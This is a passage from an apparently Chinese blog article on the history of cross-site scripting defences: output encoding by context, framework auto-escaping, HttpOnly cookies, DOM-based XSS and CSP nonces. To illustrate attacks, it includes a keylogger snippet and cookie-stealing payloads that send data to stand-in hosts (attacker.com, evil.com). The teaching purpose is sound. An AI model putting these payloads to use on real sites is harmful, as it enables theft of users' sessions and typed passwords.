+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>语义歧义被消除了：浏览器看到的是一串文字符号，而不是一个可执行的脚本标签。</p>
+<h3 id="42-上下文是关键一套编码解决不了所有问题">4.2 上下文是关键：一套编码解决不了所有问题</h3>
+<p>这里有一个极易被忽视的陷阱，也是语义歧义的另一个体现：<strong>不同的输出位置有不同的语法规则，需要针对性的编码方式</strong>。</p>
+<p>把数据放入 HTML 元素内容、放入 HTML 属性值、放入 JavaScript 字符串、放入 URL 参数——这是四个不同的&quot;上下文&quot;，每个上下文有自己的解析规则，因此需要不同的编码策略：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 上下文一：HTML 元素内容 → 用 HTML 实体编码 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>{{ user_input | html_encode }}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 上下文二：HTML 属性值 → 必须有引号包裹，且对引号编码 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;{{ user_input | html_attr_encode }}&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 上下文三：JavaScript 字符串 → 用 JS 字符串转义，不能用 HTML 实体 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&#34;{{ user_input | js_encode }}&#34;</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 注意：JS 引擎不理解 HTML 实体，&amp;lt; 在这里是字面的 &amp; l t ;，不是 &lt; --&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 上下文四：URL 参数 → 用 URL 编码 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/search?q={{ user_input | url_encode }}&#34;</span><span class="p">&gt;</span>搜索<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最典型的上下文错误：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- ❌ 做了 HTML 编码，但忘记给属性值加引号 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 攻击者输入：x onmouseover=evil() --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">x</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">evil()</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 没有引号，空格就成为属性分隔符，注入成功 --&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- ✅ 正确：属性值必须用引号包裹 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;x onmouseover=evil()&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 有了引号，整个字符串都是 value 的值，安全 --&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="43-框架内建防御默认安全显式危险">4.3 框架内建防御：&ldquo;默认安全，显式危险&rdquo;</h3>
+<p>手动在每个输出点做正确的上下文感知编码，既繁琐又容易遗漏。主流 Web 框架在这个阶段接过了这份责任，把正确的行为变成<strong>默认行为</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- Rails ERB：自动 HTML 转义 ✅ --&gt;
+</span></span><span class="line"><span class="cl">&lt;%= user.bio %&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!-- 明确声明关闭转义 ⚠️ ——警示词&#34;html_safe&#34;是对开发者的提醒 --&gt;
+</span></span><span class="line"><span class="cl">&lt;%= user.bio.html_safe %&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- Django：自动转义 ✅ --&gt;</span>
+</span></span><span class="line"><span class="cl">{{ user.bio }}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 显式关闭 ⚠️ --&gt;</span>
+</span></span><span class="line"><span class="cl">{{ user.bio | safe }}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个设计哲学被称为 <strong>&ldquo;默认安全，显式危险&rdquo;</strong>：危险的操作不是被禁止的，但需要开发者写出一个带有明显警示词（<code>html_safe</code>、<code>safe</code>、<code>dangerouslySetInnerHTML</code>）的特殊 API 才能触发。这强迫开发者在危险操作面前停下来，问一句自己：&ldquo;我为什么要这样做？我确定这里的内容是安全的吗？&rdquo;</p>
+<h3 id="44-httponly-cookie切断最直接的战果路径2002">4.4 HttpOnly Cookie：切断最直接的战果路径（2002）</h3>
+<p>2002 年，微软在 IE6 SP1 中引入了 <strong>HttpOnly Cookie</strong> 属性。原理极其简单：带有这个标志的 Cookie，JavaScript 代码无法通过 <code>document.cookie</code> 读取。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Set-Cookie: session_id=abc123; HttpOnly; Secure
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>  <span class="c1">// 返回值中不包含 session_id
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>HttpOnly 不阻止 XSS 攻击本身，但它切断了 XSS <strong>最直接的战果路径</strong>——窃取 session Cookie 来直接劫持用户登录状态。</p>
+<p>然而，攻击者的字典里从不缺备用方案：</p>
+<p><strong>方案一：直接用已登录状态操作</strong>。Cookie 拿不到，但浏览器发起请求时会自动携带它。攻击脚本可以直接在受害者的浏览器里发起&quot;修改密码&quot;、&ldquo;转账&quot;等请求——Cookie 由浏览器这个忠实的中间人自动带上，攻击者完全不需要&quot;看到&quot;Cookie 的值。</p>
+<p><strong>方案二：键盘记录</strong>。在页面里注入键盘监听脚本，session Cookie 被保护了，但用户<strong>正在输入的</strong>新密码、信用卡号，依然暴露：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// XSS 注入的键盘记录（示意）
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;keydown&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">keyBuffer</span> <span class="o">+=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">keyBuffer</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;https://attacker.com/k?d=&#39;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">keyBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">keyBuffer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>方案三：利用浏览器密码自动填充</strong>。注入一个不可见的 <code>&lt;input type=&quot;password&quot;&gt;</code>，等待浏览器密码管理器自动填充，再读取值。（现代浏览器已有针对此模式的防护，但这展示了攻击者的思路：保护一条路，他们就走另一条。）</p>
+<p>所以，HttpOnly 是有价值的<strong>纵深防御层</strong>，而不是解决方案本身。它的意义是：在其他防线失守之后，限制攻击者能获得的最大战果。</p>
+<hr>
+<h2 id="第五章dom-的暗流服务器看不见的战场2005-年-7-月">第五章：DOM 的暗流——服务器看不见的战场（2005 年 7 月）</h2>
+<h3 id="51-一篇让服务器失明的论文">5.1 一篇让服务器失明的论文</h3>
+<p>2005 年 7 月，安全研究员 Amit Klein 向 Web Application Security Consortium 提交了一篇题为《DOM Based Cross Site Scripting or XSS of the Third Kind》的论文。他发现了一类特殊的 XSS：</p>
+<p><strong>攻击数据从来不经过服务器</strong>。</p>
+<p>URL 的 <code>#</code>（fragment）之后的内容，是浏览器自己的事情，<strong>不会发送给服务器</strong>。但前端 JavaScript 代码可以直接读取它，然后写入 DOM。整个攻击在浏览器内部完成，服务器的日志干干净净，服务器端的任何输出编码对它完全无效。</p>
+<p>Klein 将其命名为 <strong>DOM-based XSS</strong>，第三类 XSS。</p>
+<h3 id="52-一个必要的认知转折浏览器是独立的第三方">5.2 一个必要的认知转折：浏览器是独立的第三方</h3>
+<p>理解 DOM XSS，先要纠正一个根深蒂固的直觉。</p>
+<p>大多数人脑子里只有两个角色：<strong>我</strong>（用户），以及<strong>那个网站</strong>（服务器）。浏览器不过是中间那根透明的管道，忠实地传递内容，不会自作主张。</p>
+<p>但这个模型在 DOM XSS 面前彻底失效了，因为它描述的不是现实。</p>
+<p>现实是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[用户] ←→ [浏览器] ←→ [服务器]
+</span></span><span class="line"><span class="cl">          ↑
+</span></span><span class="line"><span class="cl">     这是一个独立的、有自己执行逻辑的第三方
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>浏览器在执行谁的代码，它在那一刻就听谁的。</strong> 当你访问 <code>bank.com</code>，浏览器下载并运行 <code>bank.com</code> 的 JavaScript，这段代码可以读取页面上的一切，可以发起请求，可以改写 DOM。浏览器此刻是服务器的代理人，不是你的。</p>
+<p>通常这没有问题。但 DOM XSS 揭示了更深一层的陷阱：<strong>不只是服务器可以驱动浏览器，浏览器里运行的前端代码本身，也可以从 URL、referrer 等地方读取攻击者放置的数据，然后自己完成整个攻击——服务器全程不知情。</strong></p>
+<p>想象浏览器是一个快递员，他验证了包裹来自 <code>bank.com</code> 的合法地址，然后拆开执行了里面的指令。但指令写的是：&ldquo;请从你的快递单（URL hash）上读取备注，然后按备注内容行事&rdquo;——而那个备注，是攻击者在路上偷偷写上去的。服务器发出包裹时，那个备注还不存在。</p>
+<p>这就是 DOM XSS 的本质：<strong>浏览器被自己的前端代码&quot;指挥&rdquo;，读取了攻击者控制的数据，并把它当作代码执行了。服务器是这场攻击的局外人。</strong></p>
+<h3 id="53-浏览器自导自演">5.3 浏览器自导自演</h3>
+<p>一个经典的有漏洞的前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// 页面逻辑：根据 URL hash 显示欢迎语言
+</span></span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">lang</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// 取 # 后内容
+</span></span></span><span class="line"><span class="cl">  <span class="c1">// 数据从&#34;URL 上下文&#34;进入了&#34;HTML 上下文&#34;，没有任何转义
+</span></span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;welcome&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;Welcome: &#39;</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">lang</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击者的链接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://victim.com/#&lt;img src=x onerror=fetch(&#39;https://evil.com?c=&#39;+document.cookie)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>服务器收到的请求：<code>GET /</code> —— 干干净净，没有任何异常。服务器返回完全正常的 HTML 页面。但是，浏览器（这个中间人）收到响应后，<strong>自己的 JavaScript 代码</strong>读取了 URL hash，把攻击者的 payload 写进了 <code>innerHTML</code>——浏览器自导自演，完成了整个攻击，服务器是一个彻底的旁观者。</p>
+<h3 id="54-源source与汇sink追踪数据流">5.4 源（Source）与汇（Sink）：追踪数据流</h3>
+<p>理解 DOM XSS 的框架是追踪不可信数据从哪里来（Source）、流向哪里（Sink）：</p>
+<p><strong>危险的来源（Sources）</strong>——攻击者可以控制的输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span>        <span class="c1">// URL fragment，不发往服务器
+</span></span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span>      <span class="c1">// URL 查询参数
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">referrer</span>           <span class="c1">// 来源页面 URL
+</span></span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">name</span>                 <span class="c1">// 可跨页面甚至跨域传递
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>危险的汇点（Sinks）</strong>——将字符串解析并执行的 API：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">input</span><span class="p">;</span>   <span class="c1">// ❌ 高危：将字符串解析为 HTML
+</span></span></span><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span>                  <span class="c1">// ❌ 高危：将字符串作为代码执行
+</span></span></span><span class="line"><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="nx">input</span><span class="p">);</span>  <span class="c1">// ❌ 中危：可能触发 javascript: 协议
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">element</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">input</span><span class="p">;</span>  <span class="c1">// ✅ 安全：仅设置文本，不解析 HTML
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>防御规则非常简单，却经常被遗忘：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// ❌ DOM XSS 漏洞
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ✅ 如果只需显示文本
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ✅ 如果确实需要插入 HTML（比如富文本），必须先净化
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="第六章策略即防御csp-的诞生与演进20102016">第六章：策略即防御——CSP 的诞生与演进（2010–2016）</h2>
+<h3 id="61-从净化到限制执行权">6.1 从&quot;净化&quot;到&quot;限制执行权&quot;</h3>
+<p>到 2009 年，安全工程师们面对一个令人疲惫的现实：输出编码需要开发者在<strong>每一个输出点</strong>都做正确的事情。DOM XSS 更让服务器端的防御完全失效。只要有一处遗漏，攻击者就能突破。</p>
+<p>Mozilla 的安全工程师们提出了一个全新的思路，把防御的视角从&quot;数据&quot;转向了&quot;权限&quot;：</p>
+<blockquote>
+<p><strong>既然我们无法保证每一段代码都是干净的，那就告诉浏览器：只有来自白名单来源的脚本，才有执行的资格。</strong></p>
+</blockquote>
+<p>这是 <strong>Content Security Policy（内容安全策略，CSP）</strong> 的核心思想——它不阻止脚本被注入，而是阻止脚本被执行。</p>
+<p>把之前的防御比作在门口搜查每一位进来的客人（输出编码），那 CSP 则是在场馆内部安装了监控系统：进来的人无论是谁，只要做出了不在白名单里的行为（执行未经授权的脚本），立刻被踢出去。</p>
+<h3 id="62-白名单运行机制">6.2 白名单运行机制</h3>
+<p>CSP 通过 HTTP 响应头告知浏览器执行规则：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://trusted-cdn.com
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器收到这条指令后，就成了一个执行 CSP 规则的&quot;安保人员&quot;。当攻击者注入的脚本出现时：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://evil.com?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器的判断过程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这段内联脚本的来源是：inline（内联，没有明确来源）
+</span></span><span class="line"><span class="cl">CSP 的 script-src 允许：&#39;self&#39;, https://trusted-cdn.com
+</span></span><span class="line"><span class="cl">内联脚本不在白名单 → 拒绝执行，报告违规
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但这里立刻出现了一个现实问题：大量网站的正常代码本身就是内联脚本。如果 CSP 拒绝所有内联脚本，网站就残了。这就是 CSP 早期采用率极低的原因——它要么被设置得很宽松（允许 <code>'unsafe-inline'</code>，等于白设置），要么破坏正常网站功能。</p>
+<h3 id="63-nonce给合法脚本发通行证">6.3 Nonce：给合法脚本发&quot;通行证&quot;</h3>
+<p>CSP Level 2（2015）引入的 <code>nonce</code>（一次性令牌）机制解决了这个问题。</p>
+<p>这个机制的类比非常直观：想象一场演唱会。CSP 1.0 的规则是&quot;只有本场馆的员工才能进后台&quot;——但问题是，演出临时请了外援乐手，他们不是员工却需要进后台。nonce 的解法是：<strong>每场演唱会开始前，给所有被邀请的人发一个今晚专用的随机腕带。后台门口只认腕带，不问身份</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 服务器每次请求生成一个随机、不可预测的 nonce</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secrets</span>
+</span></span><span class="line"><span class="cl"><span class="n">nonce</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>  <span class="c1"># 例如：a8f3c2b1d4e5f6a7b8c9d0e1f2a3b4c5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 放入 CSP 头（腕带规格公告）</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;script-src &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 同时把 nonce 值注入合法的脚本标签（发腕带）</span>
+</span></span><span class="line"><span class="cl"><span class="n">html</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&lt;script nonce=&#34;</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s1">&#34;&gt;initializeApp();&lt;/script&gt;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 有腕带的合法脚本：✅ 浏览器放行 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;a8f3c2b1d4e5f6a7b8c9d0e1f2a3b4c5&#34;</span><span class="p">&gt;</span><span class="nx">initializeApp</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 攻击者注入的脚本，没有腕带：❌ 浏览器拒绝 --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">evil</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>安全性的关键在于：每次请求的 nonce 值必须是<strong>随机且不可预测的</strong>。攻击者即使能注入 <code>&lt;script&gt;</code> 标签，也无法猜到当前这次请求的腕带编号，因此无法伪造一个有效的通行证。</p>
+<h3 id="64-strict-dynamic信任的传递">6.4 strict-dynamic：信任的传递</h3>
+<p>nonce 机制还有一个实际问题：现代前端代码大量使用动态创建脚本（<code>createElement('script')</code>）做懒加载和代码分割。这些动态脚本无法预先注入 nonce，会被 CSP 拦截。</p>
+<p>CSP Level 3 的 <code>'strict-dynamic'</code> 指令解决了这个问题：<strong>如果一段脚本本身拥有合法的 nonce，那么它动态创建的子脚本，也自动获得执行权，无需再经白名单审查</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Content-Security-Policy: script-src &#39;nonce-{RANDOM}&#39; &#39;strict-dynamic&#39;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这就像腕带制度升级为：拿到腕带的人，可以带自己的助手进来，助手不需要单独审核。</p>
+<h3 id="65-csp-也不是无懈可击">6.5 CSP 也不是无懈可击</h3>
+<p>CSP 是强大的，但不是银弹。它有一类经典的绕过场景：<strong>白名单域名本身存在可被利用的端点</strong>。</p>
